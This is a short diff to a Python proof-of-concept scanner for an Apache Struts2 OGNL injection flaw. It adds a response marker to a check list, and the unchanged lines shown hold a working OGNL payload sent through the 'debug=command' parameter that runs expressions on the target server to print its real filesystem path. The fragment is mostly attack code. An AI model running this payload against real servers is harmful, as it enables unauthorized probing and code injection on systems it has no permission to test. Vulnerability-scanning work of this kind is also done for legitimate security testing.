@@ -7,7 +7,7 @@ warnings.filterwarnings("ignore")
 def poc(url):
     timeout = 5
     proxies = {'http': '127.0.0.1:9999'}
-    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop']
+    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop', 'Unable to initialize device PRN']
 
     poc_goop = [
         r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("Struts2-vuln-Goop"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()''',
